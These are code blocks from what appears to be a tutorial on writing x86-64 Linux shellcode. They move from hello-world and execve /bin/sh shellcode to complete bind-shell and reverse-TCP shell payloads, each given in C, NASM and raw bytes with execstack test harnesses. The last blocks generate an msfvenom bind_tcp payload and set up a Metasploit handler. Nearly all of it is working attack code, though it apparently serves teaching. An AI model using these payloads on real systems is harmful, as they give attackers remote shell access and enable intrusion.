["```\n$ objdump -D -M intel hello-world\n```", "```\n$ objdump -M intel -D FILE-NAME | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s\n```", "```\n$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s \n```", "```\n\\xb8\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x48\\xbe\\xd8\\x00\\x60\n\\x00\\x00\\x00\\x00\\x00\\xba\\x0c\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\n\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x0f\\x05\\x68\\x65\\x6c\\x6c\\x6f\\x20\n\\x77\\x6f\\x72\\x6c\\x64\\x0a\n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] =\n\n\"\\xb8\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x48\\xbe\\xd8\\x00\\x60\n\\x00\\x00\\x00\\x00\\x00\\xba\\x0c\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\n\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x0f\\x05\\x68\\x65\\x6c\\x6c\\x6f\\x20\n\\x77\\x6f\\x72\\x6c\\x64\\x0a\";\n\nint main()\n{\n   printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n   int (*ret)() = (int(*)())code;\n   ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack hello-world.c \n$ ./a.out\n```", "```\n\"\\xb8\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x48\\xbe\\xd8\\x00\\x60\n\\x00\\x00\\x00\\x00\\x00\\xba\\x0c\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\n\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x0f\\x05\\x68\\x65\\x6c\\x6c\\x6f\\x20\n\\x77\\x6f\\x72\\x6c\\x64\\x0a\";\n```", "```\nmov al, 15\n```", "```\nxor rax, rax\nadd rax, 15\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n    mov al, 1\n    mov rdi, 1\n    mov rsi, hello_world\n    mov rdx, length\n    syscall\n\n    mov rax, 60\n    mov rdi, 1\n    syscall\n\nsection .data\n    hello_world: db 'hello world',0xa\n    length: equ $-hello_world\n```", "```\n$ nasm -felf64 hello-world.nasm -o hello-world.o\n$ ld hello-world.o -o hello-world\n$ objdump -D -M intel hello-world\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n    mov al, 1\n    xor rdi, rdi\n    add rdi, 1\n    mov rsi, hello_world\n    mov rdx, length\n    syscall\n\n    mov rax, 60\n    mov rdi, 1\n    syscall\n\nsection .data\n    hello_world: db 'hello world',0xa\n    length: equ $-hello_world\n```", "```\n$ nasm -felf64 hello-world.nasm -o hello-world.o\n$ ld hello-world.o -o hello-world\n$ objdump -D -M intel hello-world\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n    mov al, 1\n    xor rdi, rdi\n    add rdi, 1\n    mov rsi, hello_world\n    xor rdx,rdx\n    add rdx,12 \n    syscall\n\n  xor rax,rax\n  add rax,60\n  xor rdi,rdi\n  syscall\n\nsection .data\n    hello_world: db 'hello world',0xa\n```", "```\n$ nasm -felf64 hello-world.nasm -o hello-world.o\n$ ld hello-world.o -o hello-world\n$ objdump -D -M intel hello-world\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n    jmp code\n    hello_world: db 'hello world',0xa\n\ncode:\n    mov al, 1\n    xor rdi, rdi\n    add rdi, 1\n    lea rsi, [rel hello_world]\n    xor rdx,rdx\n    add rdx,12 \n    syscall\n\n    xor rax,rax\n    add rax,60\n    xor rdi,rdi\n    syscall\n```", "```\n$ nasm -felf64 hello-world.nasm -o hello-world.o\n$ ld hello-world.o -o hello-world\n$ objdump -D -M intel hello-world\n```", "```\n$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s\n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] =\n\n\"\\xeb\\x0c\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x0a\\xb0\\x01\\x48\\x31\\xff\\x48\\x83\\xc7\\x01\\x48\\x8d\\x35\\xe4\\xff\\xff\\xff\\x48\\x31\\xd2\\x48\\x83\\xc2\\x0c\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x3c\\x48\\x31\\xff\\x0f\\x05\";\n\nint main()\n{\n\n    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack hello-world.c\n$ ./a.out\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n    jmp string\n\ncode:\n    pop rsi\n    mov al, 1\n    xor rdi, rdi\n    add rdi, 1\n    xor rdx,rdx\n    add rdx,12 \n    syscall\n\n    xor rax,rax\n    add rax,60\n    xor rdi,rdi\n    syscall\n\nstring:\n    call code\n    hello_world: db 'hello world',0xa\n```", "```\n$ nasm -felf64 hello-world.nasm -o hello-world.o\n$ ld hello-world.o -o hello-world\n$ objdump -D -M intel hello-world\n```", "```\n$ gdb ./hello-world\n$ set disassembly-flavor intel\n$ break _start\n$ run\n$ stepi\n```", "```\n$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s \n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] = \n\"\\xeb\\x1f\\x5e\\xb0\\x01\\x48\\x31\\xff\\x48\\x83\\xc7\\x01\\x48\\x31\\xd2\\x48\\x83\\xc2\\x0c\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x3c\\x48\\x31\\xff\\x0f\\x05\\xe8\\xdc\\xff\\xff\\xff\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x0a\";\nint main()\n{\n    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack hello-world.c\n$ ./a.out\n```", "```\nglobal _start\n\nsection .text\n_start:\n\n    xor rax, rax\n    add rax, 1\n    mov rdi, rax\n    push 0x0a646c72\n    mov rbx, 0x6f57206f6c6c6548\n    push rbx\n    mov rsi, rsp\n    xor rdx, rdx\n    add rdx, 12\n    syscall\n\n    xor rax, rax\n    add rax, 60 \n    xor rdi, rdi \n    syscall\n```", "```\n$ nasm -felf64 hello-world.nasm -o hello-world.o\n$ ld hello-world.o -o hello-world\n$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s\n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] = \n\"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x01\\x48\\x89\\xc7\\x68\\x72\\x6c\\x64\\x0a\\x48\\xbb\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x53\\x48\\x89\\xe6\\x48\\x31\\xd2\\x48\\x83\\xc2\\x0c\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x3c\\x48\\x31\\xff\\x0f\\x05\";\nint main()\n{\n    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack hello-world.c\n$ ./a.out\n```", "```\n$ man 2 execve\n```", "```\n#include <unistd.h>\n\nint main()\n{\n    char * const argv[] = {\"cat\",\"/etc/issue\", NULL};\n    execve(\"/bin/cat\", argv, NULL);\n    return 0;\n}\n```", "```\n$ gcc execve.c\n$ ./a.out\n```", "```\n char * const argv[] = {\"/bin/sh\", NULL};\n execve(\"/bin/sh\", argv, NULL);\n return 0;\n```", "```\nxor rax, rax\npush rax\nmov rdx, rsp\n```", "```\nstring ='//bin/sh'\nstring[::-1].encode('hex')\n```", "```\nmov rbx, 0x68732f6e69622f2f\npush rbx\n```", "```\nmov rdi, rsp\n```", "```\npush rax\npush rdi \nmov rsi,rsp \n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep execve\n```", "```\nadd rax, 59\nsyscall\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n    xor rax, rax\n    push rax\n    mov rdx, rsp\n    mov rbx, 0x68732f6e69622f2f\n    push rbx\n    mov rdi, rsp\n    push rax\n    push rdi\n    mov rsi,rsp\n    add rax, 59\n    syscall\n```", "```\n$ nasm -felf64 execve.nasm -o execve.o\n$ ld execve.o -o execve $ ./execve\n```", "```\n$ objdump -M intel -D execve | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s\n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] = \n\"\\x48\\x31\\xc0\\x50\\x48\\x89\\xe2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\";\nint main()\n{\n    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack execve.c\n$ ./a.out\n```", "```\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n\nint main(void)\n{\n  int clientfd, sockfd;\n  int port = 1234;\n  struct sockaddr_in mysockaddr;\n\n  sockfd = socket(AF_INET, SOCK_STREAM, 0);\n  mysockaddr.sin_family = AF_INET; //--> can be represented in\n  numeric  as 2\n  mysockaddr.sin_port = htons(port);\n  mysockaddr.sin_addr.s_addr = INADDR_ANY;// --> can be represented\n  in  numeric as 0 which means to bind to all interfaces\n\n  bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));\n\n  listen(sockfd, 1);\n\n  clientfd = accept(sockfd, NULL, NULL);\n\n  dup2(clientfd, 0);\n  dup2(clientfd, 1);\n  dup2(clientfd, 2);\n  char * const argv[] = {\"sh\",NULL, NULL};\n  execve(\"/bin/sh\", argv, NULL);\n  return 0;\n}\n```", "```\nsockfd = socket(AF_INET, SOCK_STREAM, 0);\n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep socket\n```", "```\nxor rax, rax\nadd rax, 41\nxor rdi, rdi\nadd rdi, 2\nxor rsi, rsi\ninc rsi\nxor rdx, rdx\nsyscall\n```", "```\nmov rdi, rax\n```", "```\n sockfd = socket(AF_INET, SOCK_STREAM, 0);\n mysockaddr.sin_family = AF_INET;\n mysockaddr.sin_port = htons(port);\n mysockaddr.sin_addr.s_addr = INADDR_ANY;\n```", "```\nxor rax, rax \npush rax\npush word 0xd204\npush word 0x02\n```", "```\nbind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));\n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep bind\n```", "```\nmov rsi, rsp\nxor rdx, rdx\nadd rdx, 16\nxor rax, rax\nadd rax, 49\nsyscall\n```", "```\nlisten(sockfd, 1);\n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep listen\n```", "```\nxor rax, rax\nadd rax, 50\nxor rsi , rsi\ninc rsi \nsyscall\n```", "```\n clientfd = accept(sockfd, NULL, NULL);\n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep accept\n```", "```\nxor rax , rax\nadd rax, 43\nxor rsi, rsi\nxor rdx, rdx\nsyscall\n```", "```\nmov rbx, rax\n```", "```\n dup2(clientfd, 0);\n dup2(clientfd, 1);\n dup2(clientfd, 2);\n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep dup2\n```", "```\nmov rdi, rbx\nxor rax,rax\nadd rax, 33\nxor rsi, rsi\nsyscall\n\nxor rax,rax\nadd rax, 33\ninc rsi\nsyscall\n\nxor rax,rax\nadd rax, 33\ninc rsi\nsyscall\n```", "```\nchar * const argv[] = {\"sh\",NULL, NULL};\nexecve(\"/bin/sh\", argv, NULL);\nreturn 0;\n\nxor rax, rax\npush rax\nmov rdx, rsp\nmov rbx, 0x68732f6e69622f2f\npush rbx\nmov rdi, rsp\npush rax\npush rdi\nmov rsi,rsp\nadd rax, 59\nsyscall\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n\n;Socket syscall\n    xor rax, rax\n    add rax, 41\n    xor rdi, rdi\n    add rdi, 2\n    xor rsi, rsi\n    inc rsi\n    xor rdx, rdx\n    syscall\n\n; Save the sockfd in RDI Register \n    mov rdi, rax\n\n;Creating the structure \n    xor rax, rax \n    push rax\n    push word 0xd204\n    push word 0x02\n;Bind syscall\n    mov rsi, rsp\n    xor rdx, rdx\n    add rdx, 16\n    xor rax, rax\n    add rax, 49\n    syscall\n\n;Listen syscall\n    xor rax, rax\n    add rax, 50\n    xor rsi , rsi\n    inc rsi\n    syscall\n\n;Accept syscall\n    xor rax , rax\n    add rax, 43\n    xor rsi, rsi\n    xor rdx, rdx\n    syscall\n\n;Store clientfd in RBX register \n    mov rbx, rax\n\n;Dup2 syscall to stdin\n    mov rdi, rbx\n    xor rax,rax\n    add rax, 33\n    xor rsi, rsi\n    syscall\n\n;Dup2 syscall to stdout\n    xor rax,rax\n    add rax, 33\n    inc rsi\n    syscall\n\n;Dup2 syscall to stderr\n    xor rax,rax\n    add rax, 33\n    inc rsi\n    syscall\n\n;Execve syscall with /bin/sh\n    xor rax, rax\n    push rax\n    mov rdx, rsp\n    mov rbx, 0x68732f6e69622f2f\n    push rbx\n    mov rdi, rsp\n    push rax\n    push rdi\n    mov rsi,rsp\n    add rax, 59\n    syscall\n```", "```\n$ nasm -felf64 bind-shell.nasm -o bind-shell.o\n$ ld bind-shell.o -o bind-shell\n```", "```\n$ objdump -M intel -D bind-shell | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s\n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] =\n\n\"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x29\\x48\\x31\\xff\\x48\\x83\\xc7\\x02\\x48\\x31\\xf6\\x48\\xff\\xc6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x66\\x68\\x04\\xd2\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x31\\xd2\\x48\\x83\\xc2\\x10\\x48\\x31\\xc0\\x48\\x83\\xc0\\x31\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x32\\x48\\x31\\xf6\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x2b\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc3\\x48\\x89\\xdf\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\x89\\xe2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\";\n\nint main()\n {\n    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack bind-shell.c\n$ ./a.out\n```", "```\n$ netstat -ntlp\n```", "```\n$ nc localhost 1234\n```", "```\n$ cat /etc/issue\n```", "```\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h> \n\nint main(void)\n{\n    int sockfd;\n    int port = 1234;\n    struct sockaddr_in mysockaddr;\n\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    mysockaddr.sin_family = AF_INET;\n    mysockaddr.sin_port = htons(port);\n    mysockaddr.sin_addr.s_addr = inet_addr(\"192.168.238.1\");\n\n    connect(sockfd, (struct sockaddr *) &mysockaddr,\n    sizeof(mysockaddr));\n\n    dup2(sockfd, 0);\n    dup2(sockfd, 1);\n    dup2(sockfd, 2);\n\n    char * const argv[] = {\"/bin/sh\", NULL};\n    execve(\"/bin/sh\", argv, NULL);\n    return 0;\n}\n```", "```\n$ nc -lp 1234\n```", "```\n$ gcc reverse-tcp.c -o reverse-tcp\n$ ./reverse-tcp\n```", "```\nxor rax, rax\nadd rax, 41\nxor rdi, rdi\nadd rdi, 2\nxor rsi, rsi\ninc rsi\nxor rdx, rdx\nsyscall\n\nmov rdi, rax\n```", "```\nxor rax, rax \npush dword 0x01eea8c0\npush word 0xd204\npush word 0x02\n\nmov rsi, rsp\n```", "```\n connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));\n```", "```\n$ man 2 connect\n```", "```\n$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep connect\n```", "```\nxor rdx, rdx\nadd rdx, 16\nxor rax, rax\nadd rax, 42\nsyscall\n```", "```\nxor rax,rax\nadd rax, 33\nxor rsi, rsi\nsyscall\n\nxor rax,rax\nadd rax, 33\ninc rsi\nsyscall\n\nxor rax,rax\nadd rax, 33\ninc rsi\nsyscall\n```", "```\nxor rax, rax\npush rax\nmov rdx, rsp\nmov rbx, 0x68732f6e69622f2f\npush rbx\nmov rdi, rsp\npush rax\npush rdi\nmov rsi,rsp\nadd rax, 59\nsyscall\n```", "```\nglobal _start\n\nsection .text\n\n_start:\n\n;Socket syscall\n    xor rax, rax\n    add rax, 41\n    xor rdi, rdi\n    add rdi, 2\n    xor rsi, rsi\n    inc rsi\n    xor rdx, rdx\n    syscall\n\n; Save the sockfd in RDI Register\n    mov rdi, rax\n\n;Creating the structure\n    xor rax, rax \n    push dword 0x01eea8c0\n    push word 0xd204\n    push word 0x02\n\n;Move stack pointer to RSI\n    mov rsi, rsp\n\n;Connect syscall\n    xor rdx, rdx\n    add rdx, 16\n    xor rax, rax\n    add rax, 42\n    syscall\n\n;Dup2 syscall to stdin\n    xor rax,rax\n    add rax, 33\n    xor rsi, rsi\n    syscall\n\n;Dup2 syscall to stdout\n    xor rax,rax\n    add rax, 33\n    inc rsi\n    syscall\n\n;Dup2 syscall to stderr\n    xor rax,rax\n    add rax, 33\n    inc rsi\n    syscall\n\n;Execve syscall with /bin/sh\n    xor rax, rax\n    push rax\n    mov rdx, rsp\n    mov rbx, 0x68732f6e69622f2f\n    push rbx\n    mov rdi, rsp\n    push rax\n    push rdi\n    mov rsi,rsp\n    add rax, 59\n    syscall\n```", "```\n$ nasm -felf64 reverse-tcp.nasm -o reverse-tcp.o\n$ ld reverse-tcp.o -o reverse-tcp\n```", "```\n$ nc -lp 1234\n```", "```\n$ ./reverse-tcp\n```", "```\n$ objdump -M intel -D reverse-tcp | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\\\x/g' | paste -d '' -s\n```", "```\n#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] =\n\n\"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x29\\x48\\x31\\xff\\x48\\x83\\xc7\\x02\\x48\\x31\\xf6\\x48\\xff\\xc6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x68\\xc0\\xa8\\xee\\x01\\x66\\x68\\x04\\xd2\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x31\\xd2\\x48\\x83\\xc2\\x10\\x48\\x31\\xc0\\x48\\x83\\xc0\\x2a\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\x89\\xe2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\";\n\nint main()\n {\n    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack reverse-tcp-shellcode.c -o reverse-tcp-shellcode\n```", "```\n$ nc -lp 1234\n```", "```\n$ ./reverse-tcp-shellcode\n```", "```\n$ msfvenom -a x64 --platform linux -p linux/x64/shell/bind_tcp -b \"\\x00\" -f c\n```", "```\n#include<stdio.h>\n#include<string.h>\nunsigned char code[] =\n\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\"\n\"\\xff\\xff\\x48\\xbb\\xdd\\x0a\\x08\\xe9\\x70\\x39\\xf7\\x21\\x48\\x31\\x58\"\n\"\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xb7\\x23\\x50\\x70\\x1a\\x3b\"\n\"\\xa8\\x4b\\xdc\\x54\\x07\\xec\\x38\\xae\\xa5\\xe6\\xd9\\x2e\\x0a\\xe9\\x61\"\n\"\\x65\\xbf\\xa8\\x3b\\x60\\x18\\xb3\\x1a\\x08\\xaf\\x2e\\xd8\\x53\\x62\\xdb\"\n\"\\x28\\x36\\xf2\\x69\\x4b\\x60\\x23\\xb1\\x7f\\x3c\\xa7\\x77\\x82\\x60\\x01\"\n\"\\xb1\\xe9\\x8f\\xe7\\x69\\x54\\xdc\\x45\\xd8\\xb9\\x53\\xd5\\x60\\x87\\xb8\"\n\"\\x0f\\xe6\\x75\\x71\\x61\\x69\\x4a\\x55\\x07\\xec\\x8f\\xdf\\xf7\\x21\";\n\nint main()\n{\n     printf(\"Shellcode Length: %d\\n\", (int)strlen(code));\n     int (*ret)() = (int(*)())code;\n     ret();\n}\n```", "```\n$ gcc -fno-stack-protector -z execstack bin-tcp-msf.c -o bin-tcp-msf\n$ ./bin-tcp-msf\n```", "```\nuse exploit/multi/handler\n```", "```\nset PAYLOAD linux/x64/shell/bind_tcp\n```", "```\nset RHOST 192.168.238.128\n```", "```\nset LPORT 4444\n```", "```\nexploit\n```"]